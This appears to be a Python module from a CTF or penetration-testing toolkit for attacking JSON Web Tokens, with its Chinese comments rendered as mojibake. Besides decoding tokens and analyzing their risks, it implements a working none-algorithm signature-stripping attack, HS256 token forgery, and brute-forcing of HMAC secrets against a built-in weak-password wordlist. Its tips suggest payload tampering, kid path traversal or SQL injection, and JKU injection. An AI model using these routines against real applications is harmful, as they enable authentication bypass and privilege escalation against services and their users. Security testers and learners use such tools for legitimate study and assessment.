"""JWT å·¥å· â è§£æãåæãæ»å» JSON Web Token.

æ¯æ:
    - è§£ç  header/payload (ä¸éªè¯ç­¾å)
    - ç®æ³æ£æµ & é£é©åæ
    - None ç®æ³æ»å»
    - å¼±å¯é¥æç¤º
    - æ¶é´æææ§æ£æ¥
"""
import json
import base64
import time
import hmac
import hashlib
from typing import Optional, Tuple, Dict, Any, List


def _b64url_decode(data: str) -> bytes:
    """URL-safe base64 è§£ç  (JWT ä¸ç¨, æ  padding)."""
    data = data.strip()
    # JWT ä½¿ç¨ base64url æ  padding
    missing = len(data) % 4
    if missing:
        data += "=" * (4 - missing)
    data = data.replace("-", "+").replace("_", "/")
    return base64.b64decode(data)


def _b64url_encode(data: bytes) -> str:
    """URL-safe base64 ç¼ç ."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt(token: str) -> Tuple[Optional[Dict], Optional[Dict], Optional[str]]:
    """è§£ç  JWT (ä¸éªè¯ç­¾å).

    è¿å: (header, payload, signature_raw) æ (None, None, éè¯¯ä¿¡æ¯).
    """
    token = token.strip()
    parts = token.split(".")

    if len(parts) != 3:
        return None, None, "Invalid JWT: expected 3 parts (header.payload.signature)"

    try:
        header_bytes = _b64url_decode(parts[0])
        payload_bytes = _b64url_decode(parts[1])
        header = json.loads(header_bytes)
        payload = json.loads(payload_bytes)
    except Exception as e:
        return None, None, f"Decode error: {e}"

    return header, payload, parts[2]


def analyze_jwt(token: str) -> dict:
    """å¨é¢åæ JWT Token.

    è¿ååæç»æå­å¸.
    """
    header, payload, sig = decode_jwt(token)
    if header is None:
        return {"error": sig}

    analysis = {
        "header": header,
        "payload": payload,
        "signature": sig[:20] + "..." if len(sig) > 20 else sig,
        "algorithm": header.get("alg", "unknown"),
        "warnings": [],
        "tips": [],
    }

    alg = header.get("alg", "").upper()

    # ââ ç®æ³é£é©åæ ââ
    if alg == "NONE" or alg == "NONE":
        analysis["warnings"].append("â  None ç®æ³ â ç­¾åå¯è¢«ç»è¿!")
        analysis["tips"].append("å°è¯å é¤ç­¾åé¨å, è®¾ç½® alg=none")

    if alg == "HS256" or alg == "HS384" or alg == "HS512":
        analysis["warnings"].append("â  HMAC ç­¾å â è¥å¯é¥æ³é²å¯è¢«ä¼ªé ")
        analysis["tips"].append("å°è¯å¼±å¯é¥çç ´: yang_web jwt -t <token> -w <wordlist>")

    if alg.startswith("RS") or alg.startswith("ES"):
        analysis["warnings"].append("â  éå¯¹ç§°å å¯ â æ£æ¥æ¯å¦å­å¨å¯é¥æ··æ·æ¼æ´ (alg=none)")

    if alg.startswith("HS") and "jku" in header:
        analysis["warnings"].append("â  åç° jku å¤´ â å¯è½å­å¨ JKU æ³¨å¥é£é©")
        analysis["tips"].append("æ£æ¥ jku å°åæ¯å¦å¯æ§")

    if "kid" in header:
        kid = header["kid"]
        analysis["tips"].append(f"kid = '{kid}' â å°è¯è·¯å¾éåæ SQL æ³¨å¥")

    # ââ æ¶é´æ£æ¥ ââ
    now = int(time.time())
    if "exp" in payload:
        exp = payload["exp"]
        if exp < now:
            analysis["warnings"].append(f"â  Token å·²è¿æ (exp: {exp}, now: {now})")
            analysis["tips"].append(f"Token äº {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(exp))} è¿æ")
        else:
            remaining = exp - now
            analysis["info"] = f"Token æææå©ä½: {remaining // 3600}h {(remaining % 3600) // 60}m"

    if "iat" in payload:
        iat = payload["iat"]
        analysis["info"] = analysis.get("info", "") + f" | ç­¾åæ¶é´: {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(iat))}"

    if "nbf" in payload:
        nbf = payload["nbf"]
        if nbf > now:
            analysis["warnings"].append(f"â  Token å°æªçæ (nbf: {nbf}, now: {now})")

    # ââ payload åæ ââ
    sensitive_fields = ["password", "passwd", "secret", "key", "token", "admin", "role", "is_admin"]
    for field in sensitive_fields:
        if field in payload:
            analysis["tips"].append(f"åç°ææå­æ®µ '{field}' = '{payload[field]}' â å°è¯ç¯¡æ¹")

    return analysis


def none_attack(token: str) -> Tuple[str, dict]:
    """None ç®æ³æ»å» â ç§»é¤ç­¾åå¹¶å°ç®æ³è®¾ä¸º none.

    è¿å: (æ°token, è§£ç åçpayload).
    """
    header, payload, _ = decode_jwt(token)
    if header is None:
        return "", {"error": payload}

    header["alg"] = "none"
    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    new_token = f"{new_header}.{new_payload}."

    return new_token, payload


def forge_hs256(token: str, secret: str, new_payload: Optional[dict] = None) -> str:
    """ä½¿ç¨å·²ç¥å¯é¥ä¼ªé  HS256 JWT.

    Args:
        token: åå§ token (ç¨äºæå header)
        secret: HMAC å¯é¥
        new_payload: æ°ç payload (None åä½¿ç¨å payload)
    """
    header, payload, _ = decode_jwt(token)
    if header is None:
        return ""

    header["alg"] = "HS256"
    target_payload = new_payload if new_payload else payload

    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(target_payload, separators=(",", ":")).encode())

    signing_input = f"{header_b64}.{payload_b64}"
    signature = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    sig_b64 = _b64url_encode(signature)

    return f"{signing_input}.{sig_b64}"


def brute_jwt(token: str, wordlist: list) -> List[Tuple[str, str]]:
    """çç ´ HS256 JWT å¯é¥ (ä½¿ç¨å¸¸è§å¼±å¯ç ).

    è¿å: [(å¯é¥, å®æ´Token), ...] å¹éçç»æ.
    """
    header, payload, sig_orig = decode_jwt(token)
    if header is None:
        return []

    header["alg"] = "HS256"
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}"

    results = []
    for secret in wordlist:
        secret = secret.strip()
        if not secret:
            continue
        sig = _b64url_encode(hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest())
        if sig == sig_orig:
            results.append((secret, f"{signing_input}.{sig}"))
    return results


# åå»ºå¼±å¯ç åè¡¨
BUILTIN_WORDLIST = [
    "secret", "password", "123456", "admin", "key", "jwt_secret",
    "secret_key", "mysecret", "changeme", "super_secret", "iloveyou",
    "letmein", "monkey", "dragon", "master", "qwerty", "football",
    "baseball", "trustno1", "sunshine", "princess", "welcome",
    "secret123", "password123", "admin123", "ctf", "flag",
    "key123", "jwt_key", "jwt", "token", "secure", "security",
    "private_key", "public_key", "api_key", "api_secret",
    "5ecret", "P@ssw0rd", "s3cr3t", "p@ssword",
]
